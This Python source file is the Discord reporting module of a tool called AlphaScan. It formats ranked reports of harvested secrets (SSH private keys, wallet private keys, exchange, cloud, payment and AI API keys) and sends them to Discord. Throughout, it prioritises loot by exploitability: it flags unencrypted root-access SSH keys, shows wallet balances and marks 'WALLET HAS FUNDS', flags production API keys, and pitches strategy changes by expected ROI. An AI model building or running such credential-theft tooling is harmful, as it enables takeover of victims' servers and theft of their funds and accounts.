"""
Clean Discord Reporter for AlphaScan v0.5.

Formats classified, ranked secret intelligence reports for Discord.
Prioritizes high-value keys and presents them in a clean, readable format.
"""
import logging
from typing import Dict, List, Optional
from datetime import datetime
from config.settings import MAX_KEYS_PER_REPORT
from verification.key_rank import (
    KeyRanker, RANK_NAMES, RANK_COLORS, RANK_GROUPS,
)

logger = logging.getLogger(__name__)


class DiscordReporter:
    """
    Generates clean, classified, prioritized reports for Discord.

    Report format:
    ═══════════════════════════════════════════════════════════════════════
    🔐 ALPHASCAN v0.5 - SECRET INTELLIGENCE REPORT
    ═══════════════════════════════════════════════════════════════════════

    📊 SUMMARY:
      • Total Secrets Found: 47
      • 🔴 Rank 0 (SSH Keys): 3
      • 🟠 Rank 1-3 (Critical): 7
      • 🟡 Rank 4-6 (High Value): 12
      • 🟢 Rank 7-10 (Standard): 25
    """

    def __init__(self):
        self._ranker = KeyRanker()

    def generate_report(self, keys: List[Dict], cycle: int = 0) -> Dict:
        """
        Generate a complete classified report.

        Args:
            keys: List of verified, ranked key dicts.
            cycle: Current scan cycle number.

        Returns:
            Dict with 'content' (text) and 'embeds' (Discord embed objects).
        """
        # Sort keys by rank (ascending - rank 0 first)
        sorted_keys = sorted(keys, key=lambda k: k.get("rank", 10))

        # Limit to max keys per report
        sorted_keys = sorted_keys[:MAX_KEYS_PER_REPORT]

        # Generate summary
        summary = self._generate_summary(sorted_keys)

        # Generate content text
        content = self._generate_content(summary, cycle)

        # Generate embeds for each rank group
        embeds = self._generate_embeds(sorted_keys)

        return {
            "content": content,
            "embeds": embeds,
        }

    def _generate_summary(self, keys: List[Dict]) -> Dict:
        """Generate summary statistics."""
        summary = {
            "total": len(keys),
            "rank_0": 0,
            "rank_1_3": 0,
            "rank_4_6": 0,
            "rank_7_10": 0,
            "by_rank": {},
        }

        for key in keys:
            rank = key.get("rank", 10)
            summary["by_rank"][rank] = summary["by_rank"].get(rank, 0) + 1

            if rank == 0:
                summary["rank_0"] += 1
            elif rank <= 3:
                summary["rank_1_3"] += 1
            elif rank <= 6:
                summary["rank_4_6"] += 1
            else:
                summary["rank_7_10"] += 1

        return summary

    def _generate_content(self, summary: Dict, cycle: int) -> str:
        """Generate the main content text for the report."""
        lines = [
            "═══════════════════════════════════════════════════════════════════════",
            "🔐 ALPHASCAN v0.5 - SECRET INTELLIGENCE REPORT",
            "═══════════════════════════════════════════════════════════════════════",
            "",
            "📊 SUMMARY:",
            f"  • Total Secrets Found: {summary['total']}",
            f"  • 🔴 Rank 0 (SSH Keys): {summary['rank_0']}",
            f"  • 🟠 Rank 1-3 (Critical): {summary['rank_1_3']}",
            f"  • 🟡 Rank 4-6 (High Value): {summary['rank_4_6']}",
            f"  • 🟢 Rank 7-10 (Standard): {summary['rank_7_10']}",
        ]

        if cycle > 0:
            lines.append(f"  • Cycle: #{cycle}")

        lines.append("")
        lines.append("═══════════════════════════════════════════════════════════════════════")

        return "\n".join(lines)

    def _generate_embeds(self, keys: List[Dict]) -> List[Dict]:
        """Generate Discord embeds for each rank group."""
        embeds = []

        # Group keys by rank group
        groups = {
            "critical": [],
            "high": [],
            "medium": [],
            "standard": [],
        }

        for key in keys:
            rank = key.get("rank", 10)
            group = self._ranker.get_rank_group(rank)
            groups[group].append(key)

        # Generate embed for each non-empty group
        group_emojis = {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "standard": "🟢",
        }

        group_titles = {
            "critical": "RANK 0: SSH PRIVATE KEYS (CRITICAL)",
            "high": "RANK 1-3: CRYPTO EXCHANGE & PRIVATE KEYS (CRITICAL)",
            "medium": "RANK 4-6: HOT WALLETS & DEFi ADMIN KEYS (HIGH VALUE)",
            "standard": "RANK 7-10: CLOUD, PAYMENT, AI & DEV KEYS (STANDARD)",
        }

        for group_name in ["critical", "high", "medium", "standard"]:
            group_keys = groups[group_name]
            if not group_keys:
                continue

            emoji = group_emojis[group_name]
            title = group_titles[group_name]
            color = RANK_COLORS.get(group_keys[0].get("rank", 10), 0x5865F2)

            # Build fields for this group
            fields = []
            for i, key in enumerate(group_keys[:10], 1):  # Limit to 10 per embed
                field = self._format_key_field(key, i)
                fields.append(field)

            embed = {
                "title": f"{emoji} {title}",
                "fields": fields,
                "color": color,
                "footer": {
                    "text": f"AlphaScan v0.5 • {len(group_keys)} key(s) in this category"
                },
            }
            embeds.append(embed)

        return embeds

    def _format_key_field(self, key: Dict, index: int) -> Dict:
        """Format a single key as a Discord embed field."""
        key_type = key.get("type", "unknown")
        rank = key.get("rank", 10)
        rank_name = RANK_NAMES.get(rank, "Unknown")
        description = key.get("description", "")
        masked_value = key.get("masked_value", "[redacted]")

        # Build field value
        lines = [
            f"**Type:** {key_type}",
            f"**Rank:** {rank} ({rank_name})",
            f"**Value:** `{masked_value}`",
        ]

        # Add SSH-specific info
        if key_type.startswith("ssh_"):
            fingerprint = key.get("fingerprint", "N/A")
            encrypted = key.get("encrypted", False)
            permissions = key.get("permissions", "UNKNOWN")
            key_format = key.get("key_format", "Unknown")
            key_size = key.get("key_size", 0)

            lines.append(f"**Fingerprint:** {fingerprint}")
            lines.append(f"**Format:** {key_format} ({'Encrypted' if encrypted else 'Unencrypted'})")
            lines.append(f"**Key Size:** {key_size} bits")
            lines.append(f"**Permissions:** {permissions}")

            if not encrypted and permissions in ("ROOT ACCESS", "ADMIN ACCESS"):
                lines.append("⚠️  **CRITICAL** - Root/admin access to production server")

        # Add crypto-specific info
        elif key_type in ("eth_private_key", "eth_private_key_raw", "btc_wif"):
            verification = key.get("verification", {})
            type_specific = verification.get("type_specific", {})
            if "wallet_address" in type_specific:
                lines.append(f"**Wallet:** {type_specific['wallet_address']}")
                balance = type_specific.get("balance_check", {})
                if balance.get("checked"):
                    balance_eth = balance.get("balance_eth", 0)
                    lines.append(f"**Balance:** {balance_eth} ETH")
                    if balance.get("has_funds"):
                        lines.append("💰 **WALLET HAS FUNDS**")

        # Add API-specific info
        elif key_type in ("aws", "openai", "claude", "stripe_live", "github"):
            is_prod = key.get("is_production", False)
            if is_prod:
                lines.append("🏭 **Production Environment**")

        # Add context
        context = key.get("context", "")
        if context:
            lines.append(f"**Context:** {context[:100]}...")

        return {
            "name": f"{index}. {description}",
            "value": "\n".join(lines),
            "inline": False,
        }

    def generate_status_report(self, status: Dict) -> str:
        """Generate a status update message."""
        lines = [
            "📡 **AlphaScan v0.5 - Status Update**",
            f"- Cycle #{status.get('cycle', 0)}",
            f"- Running: {'Yes' if status.get('running') else 'No'}",
            f"- Total Keys Found: {status.get('total_keys_found', 0)}",
            f"- Total Scans: {status.get('total_scans', 0)}",
            f"- Last Scan: {status.get('last_scan_time', 'N/A')}",
            f"- Duration: {status.get('last_scan_duration', 0):.1f}s",
        ]

        if status.get("last_error"):
            lines.append(f"- Last Error: {status['last_error']}")

        return "\n".join(lines)

    def generate_pivot_proposal(self, proposal: Dict) -> Dict:
        """Generate a pivot proposal message for Discord."""
        content = (
            "🔄 **Strategy Pivot Proposal**\n"
            f"- Current Strategy: {proposal.get('current_strategy', 'N/A')}\n"
            f"- Proposed Strategy: {proposal.get('proposed_strategy', 'N/A')}\n"
            f"- Expected ROI Improvement: {proposal.get('expected_roi_improvement', 0):.1%}\n"
            f"- Confidence: {proposal.get('confidence', 0):.2f}\n"
            "\n"
            "Approve with `!approve-pivot` or deny with `!deny-pivot`"
        )

        embeds = [{
            "title": "Strategy Pivot Proposal",
            "description": proposal.get("reasoning", ""),
            "color": 0xFFA500,
            "fields": [
                {"name": "Current", "value": proposal.get("current_strategy", "N/A"), "inline": True},
                {"name": "Proposed", "value": proposal.get("proposed_strategy", "N/A"), "inline": True},
                {"name": "Expected ROI", "value": f"{proposal.get('expected_roi_improvement', 0):.1%}", "inline": True},
            ],
        }]

        return {"content": content, "embeds": embeds}

    def generate_feature_proposal(self, proposal: Dict) -> Dict:
        """Generate a feature proposal message for Discord."""
        content = (
            "💡 **New Feature Proposal**\n"
            f"- Feature: {proposal.get('feature', 'N/A')}\n"
            f"- Description: {proposal.get('description', 'N/A')}\n"
            f"- Confidence: {proposal.get('confidence', 0):.2f}\n"
            f"- Estimated Impact: {proposal.get('estimated_impact', 'N/A')}\n"
            "\n"
            "Approve with `!approve-feature` or deny with `!deny-feature`"
        )

        embeds = [{
            "title": "Feature Proposal",
            "description": proposal.get("description", ""),
            "color": 0x00CED1,
            "fields": [
                {"name": "Feature", "value": proposal.get("feature", "N/A"), "inline": True},
                {"name": "Confidence", "value": f"{proposal.get('confidence', 0):.2f}", "inline": True},
                {"name": "Impact", "value": proposal.get("estimated_impact", "N/A"), "inline": True},
            ],
        }]

        return {"content": content, "embeds": embeds}
